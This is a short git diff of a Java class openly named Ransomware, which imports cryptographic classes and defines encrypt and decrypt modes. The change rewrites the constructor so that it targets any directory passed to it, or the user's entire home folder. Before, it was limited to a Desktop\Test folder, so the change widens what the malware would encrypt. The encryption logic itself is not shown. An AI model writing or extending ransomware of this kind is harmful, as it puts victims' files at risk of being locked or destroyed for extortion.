@@ -24,7 +24,7 @@ import javax.crypto.spec.SecretKeySpec;
 /**
  * 
  * @author Gabriel
- *
+ * @date 4/18/2020
  */
 public class Ransomware {
 
@@ -38,8 +38,14 @@ public class Ransomware {
 	private static final int ENCRYPT = 0;
 	private static final int DECRYPT = 1;
 
-	public Ransomware() {
-		setMainDirectory(new File(System.getProperty("user.home") + "\\Desktop\\Test"));
+	public Ransomware(String directory) {
+		File directoryFile;
+		directoryFile = new File(directory);
+		if (directoryFile.isDirectory()) {
+			setMainDirectory(directoryFile);
+		} else {
+			setMainDirectory(new File(System.getProperty("user.home")));
+		}
 	}
 
 	/**
